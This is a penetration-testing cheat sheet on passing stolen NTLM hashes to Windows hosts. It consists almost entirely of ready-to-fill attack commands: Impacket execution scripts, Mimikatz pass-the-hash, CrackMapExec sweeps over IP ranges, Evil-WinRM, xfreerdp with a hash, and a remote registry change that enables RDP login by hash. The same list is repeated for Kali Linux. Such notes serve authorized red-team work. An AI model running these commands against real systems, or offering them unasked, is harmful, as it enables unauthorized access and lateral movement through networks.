**Pentest Notes: Pass the NTLM Hash (PtH)**

---

### Pass the Hash (PtH)

---

#### Windows:

**Interactive Shell:**

- **PsExec (Impacket):**
  ```bash
  psexec.py -hashes ":<hash>" <user>@<ip>
  ```

- **PsExec (Sysinternals):**
  ```bash
  psexec.exe -AcceptEULA \\<ip>
  ```

- **Mimikatz:**
  ```plaintext
  mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
  ```

**Pseudo-Shell (File Write and Read):**

- **ATExec (Impacket):**
  ```bash
  atexec.py -hashes ":<hash>" <user>@<ip> "command"
  ```

- **SMBExec (Impacket):**
  ```bash
  smbexec.py -hashes ":<hash>" <user>@<ip>
  ```

- **WMExec (Impacket):**
  ```bash
  wmiexec.py -hashes ":<hash>" <user>@<ip>
  ```

- **DCOMExec (Impacket):**
  ```bash
  dcomexec.py -hashes ":<hash>" <user>@<ip>
  ```

- **CrackMapExec:**
  ```bash
  crackmapexec smb <ip_range> -u <user> -d <domain> -H ':<hash>'
  crackmapexec smb <ip_range> -u <user> -H ':<hash>' --local-auth
  ```

**WinRM:**

- **Evil-WinRM:**
  ```bash
  evil-winrm -i <ip> -u <user> -H <hash>
  ```

**RDP:**

- **Registry Modification:**
  ```bash
  reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyne 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
  ```

- **xfreerdp:**
  ```bash
  xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
  ```

**SMB:**

- **smbclient.py:**
  ```bash
  smbclient.py -hashes ":<hash>" <user>@<ip>
  ```

**MSSQL:**

- **CrackMapExec:**
  ```bash
  crackmapexec mssql <ip_range> -H ':<hash>'
  ```

- **mssqlclient.py:**
  ```bash
  mssqlclient.py -windows-auth -hashes ":<hash>" <domain>/<user>@<ip>
  ```

---

#### Kali Linux:

**Interactive Shell:**

- **PsExec (Impacket):**
  ```bash
  psexec.py -hashes ":<hash>" <user>@<ip>
  ```

**Pseudo-Shell (File Write and Read):**

- **ATExec (Impacket):**
  ```bash
  atexec.py -hashes ":<hash>" <user>@<ip> "command"
  ```

- **SMBExec (Impacket):**
  ```bash
  smbexec.py -hashes ":<hash>" <user>@<ip>
  ```

- **WMExec (Impacket):**
  ```bash
  wmiexec.py -hashes ":<hash>" <user>@<ip>
  ```

- **DCOMExec (Impacket):**
  ```bash
  dcomexec.py -hashes ":<hash>" <user>@<ip>
  ```

- **CrackMapExec:**
  ```bash
  crackmapexec smb <ip_range> -u <user> -d <domain> -H ':<hash>'
  crackmapexec smb <ip_range> -u <user> -H ':<hash>' --local-auth
  ```

**WinRM:**

- **Evil-WinRM:**
  ```bash
  evil-winrm -i <ip> -u <user> -H <hash>
  ```

**RDP:**

- **xfreerdp:**
  ```bash
  xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
  ```

**SMB:**

- **smbclient.py:**
  ```bash
  smbclient.py -hashes ":<hash>" <user>@<ip>
  ```

**MSSQL:**

- **CrackMapExec:**
  ```bash
  crackmapexec mssql <ip_range> -H ':<hash>'
  ```

- **mssqlclient.py:**
  ```bash
  mssqlclient.py -windows-auth -hashes ":<hash>" <domain>/<user>@<ip>
  ```